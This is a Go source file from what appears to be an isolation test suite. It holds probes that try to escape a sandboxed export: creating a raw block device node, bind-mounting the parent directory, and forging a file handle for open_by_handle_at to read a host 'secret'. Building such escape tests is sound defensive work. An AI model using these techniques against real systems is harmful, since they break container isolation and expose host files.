// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam

package suite

import (
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"golang.org/x/sys/unix"
)

// deviceProbe makes a block device node with the numbers args[0]:args[1]
// and reads through it.
func deviceProbe(args []string) Result {
	if len(args) != 2 {
		return Result{Status: "error", Detail: "want major and minor"}
	}
	maj, err1 := strconv.ParseUint(args[0], 10, 32)
	min, err2 := strconv.ParseUint(args[1], 10, 32)
	if err1 != nil || err2 != nil {
		return Result{Status: "error", Detail: "want major and minor as numbers"}
	}
	dir, err := os.MkdirTemp("", "escape-dev-")
	if err != nil {
		return Result{Status: "error", Detail: err.Error()}
	}
	defer os.RemoveAll(dir)
	node := filepath.Join(dir, "disk")
	if err := unix.Mknod(node, unix.S_IFBLK|0o600, int(unix.Mkdev(uint32(maj), uint32(min)))); err != nil {
		return Result{Status: "tried", Detail: fmt.Sprintf("%d:%d mknod=%s", maj, min, short(err))}
	}
	return Result{Status: "tried", Detail: fmt.Sprintf("%d:%d read=%s", maj, min, tryRead(node))}
}

// mountProbe bind-mounts the directory above the export into the export and
// reads and writes through the mount.
func mountProbe(args []string) Result {
	t, err := outsideArgs(args)
	if err != nil {
		return Result{Status: "error", Detail: err.Error()}
	}
	unix.Mount("", "/", "", unix.MS_REC|unix.MS_PRIVATE, "") // our mounts stay ours, whatever propagation the tree had
	mnt := filepath.Join(t.guest, "mnt")
	if err := os.Mkdir(mnt, 0o755); err != nil {
		return Result{Status: "error", Detail: "mkdir: " + err.Error()}
	}
	defer os.Remove(mnt)
	if err := unix.Mount(t.guest+"/..", mnt, "", unix.MS_BIND, ""); err != nil {
		return Result{Status: "tried", Detail: "mount=" + short(err)}
	}
	defer unix.Unmount(mnt, unix.MNT_DETACH)
	return Result{Status: "tried", Detail: "mount=ok read=" + tryRead(filepath.Join(mnt, "secret")) + " write=" + tryWrite(filepath.Join(mnt, "written-"+t.token))}
}

// handleProbe opens the secret by a file handle it forges from the inode
// number, with generation 0, relative to the export: open_by_handle_at
// reaches any file on the export's filesystem when that is the host's.
func handleProbe(args []string) Result {
	t, err := outsideArgs(args)
	if err != nil {
		return Result{Status: "error", Detail: err.Error()}
	}
	dir, err := unix.Open(t.guest, unix.O_RDONLY|unix.O_DIRECTORY|unix.O_CLOEXEC, 0)
	if err != nil {
		return Result{Status: "error", Detail: "open export: " + err.Error()}
	}
	defer unix.Close(dir)
	var raw [8]byte // FILEID_INO32_GEN: inode, then generation, which 0 leaves unchecked
	binary.LittleEndian.PutUint32(raw[:], uint32(t.ino))
	fd, err := unix.OpenByHandleAt(dir, unix.NewFileHandle(1, raw[:]), unix.O_RDONLY)
	if err != nil {
		return Result{Status: "tried", Detail: "handle=" + short(err)}
	}
	f := os.NewFile(uintptr(fd), "handle")
	defer f.Close()
	b, err := io.ReadAll(io.LimitReader(f, 64))
	if err != nil {
		return Result{Status: "tried", Detail: "handle=opened read=" + short(err)}
	}
	return Result{Status: "tried", Detail: "handle=opened read=" + strconv.Quote(strings.TrimSpace(string(b)))}
}
